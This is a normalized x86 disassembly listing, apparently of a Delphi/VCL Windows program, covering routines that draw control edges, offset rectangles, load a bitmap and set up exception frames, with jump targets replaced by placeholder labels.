je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d1bc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9fc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41ca04
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42099c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c238
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444778
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41ca04
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cda8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9fc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4219a0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9d8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cda8
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cda8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cee4
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444a68
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41ca04
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_447764
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c504
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d1bc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41ccfc
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c238
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403234
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d1bc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_447764
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4482a3
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_446828
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_447764
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_4482bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cda8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41ca04
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c238
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404378
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41ca04
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cda8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444778
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d1bc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9fc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41ca04
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41ca04
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cda8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9fc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4219a0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9d8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cda8
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41cda8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
